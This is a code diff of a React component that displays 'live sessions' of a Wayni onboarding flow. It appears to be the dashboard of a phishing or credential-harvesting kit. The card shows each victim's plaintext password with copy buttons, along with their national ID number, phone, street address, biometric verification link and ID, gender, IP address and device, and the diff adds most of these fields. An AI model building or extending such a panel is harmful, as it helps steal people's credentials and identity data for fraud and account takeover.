@@ -1536,7 +1536,7 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
 
       {/* Data */}
       <div className="px-4 pb-3 space-y-2">
-        {/* User info */}
+        {/* User info row 1 */}
         <div className="flex items-center gap-3 flex-wrap">
           {dni && (
             <button onClick={() => copyText(dni, "dni")} className="flex items-center gap-1 hover:opacity-80">
@@ -1545,12 +1545,7 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
             </button>
           )}
           {userName && <span className="text-[10px] text-foreground font-medium">👤 {userName}</span>}
-          {userUuid && (
-            <button onClick={() => copyText(userUuid, "uuid")} className="flex items-center gap-1 hover:opacity-80">
-              <span className="text-[9px] font-mono text-muted-foreground">UUID: {userUuid.slice(0, 12)}...</span>
-              {copied === "uuid" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
-            </button>
-          )}
+          {otpParts.gender && <span className="text-[10px] text-muted-foreground">⚧ {otpParts.gender}</span>}
           {session.password && (
             <button onClick={() => copyText(session.password!, "spwd")} className="flex items-center gap-1 hover:opacity-80">
               <Lock size={8} className="text-yellow-400" />
@@ -1560,10 +1555,57 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
           )}
         </div>
 
-        {/* Biometric details */}
+        {/* UUID & Phone */}
+        <div className="flex items-center gap-3 flex-wrap">
+          {userUuid && (
+            <button onClick={() => copyText(userUuid, "uuid")} className="flex items-center gap-1 hover:opacity-80">
+              <span className="text-[9px] font-mono text-muted-foreground">🔑 UUID: {userUuid.slice(0, 16)}...</span>
+              {copied === "uuid" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
+            </button>
+          )}
+          {otpParts.phone && (
+            <button onClick={() => copyText(otpParts.phone, "phone")} className="flex items-center gap-1 hover:opacity-80">
+              <span className="text-[10px] text-cyan-400">📱 {otpParts.phone}</span>
+              {copied === "phone" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
+            </button>
+          )}
+        </div>
+
+        {/* Address info */}
+        {(otpParts.region || otpParts.city || otpParts.street || otpParts.zip) && (
+          <div className="rounded-lg border border-border/50 bg-secondary/30 px-3 py-2 space-y-1">
+            <span className="text-[9px] font-bold text-muted-foreground">📍 Endereço:</span>
+            <div className="flex items-center gap-2 flex-wrap text-[10px] text-foreground">
+              {otpParts.street && <span>{otpParts.street}</span>}
+              {otpParts.city && <span>• {otpParts.city}</span>}
+              {otpParts.region && <span>• {otpParts.region}</span>}
+              {otpParts.zip && <span>• CP {otpParts.zip}</span>}
+            </div>
+          </div>
+        )}
+
+        {/* Biometric link */}
+        {otpParts.biometric_url && (
+          <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 px-3 py-2 space-y-1">
+            <span className="text-[9px] font-bold text-amber-400">🔗 Link Biométrico:</span>
+            <div className="flex items-center gap-2">
+              <a href={otpParts.biometric_url} target="_blank" rel="noopener noreferrer" className="text-[9px] text-blue-400 underline truncate max-w-[300px] hover:text-blue-300">
+                {otpParts.biometric_url.length > 60 ? otpParts.biometric_url.slice(0, 60) + "..." : otpParts.biometric_url}
+              </a>
+              <button onClick={() => copyText(otpParts.biometric_url, "biourl")} className="shrink-0">
+                {copied === "biourl" ? <Check size={10} className="text-green-400" /> : <Copy size={10} className="text-muted-foreground hover:text-foreground" />}
+              </button>
+            </div>
+            {otpParts.biometric_id && (
+              <span className="text-[8px] font-mono text-muted-foreground">ID: {otpParts.biometric_id}</span>
+            )}
+          </div>
+        )}
+
+        {/* Biometric validation details */}
         {bioInfo && (
           <div className="flex items-center gap-2 flex-wrap">
-            <span className="text-[9px] font-bold text-muted-foreground">Biometria:</span>
+            <span className="text-[9px] font-bold text-muted-foreground">Validação:</span>
             <BioCheck ok={bioInfo.selfie as string} label="Selfie" />
             <BioCheck ok={bioInfo.dniFront as string} label="DNI Frente" />
             <BioCheck ok={bioInfo.dniBack as string} label="DNI Dorso" />
@@ -1587,6 +1629,14 @@ const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
                 {copied === "wuuid" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
               </button>
             )}
+          </div>
+        )}
+
+        {/* Device info */}
+        {session.ip_address && (
+          <div className="flex items-center gap-2 flex-wrap text-[9px] text-muted-foreground">
+            <span>🌐 {session.ip_address}</span>
+            {session.user_agent && <span>• {parseDevice(session.user_agent)} {parseBrowser(session.user_agent)}</span>}
           </div>
         )}
 
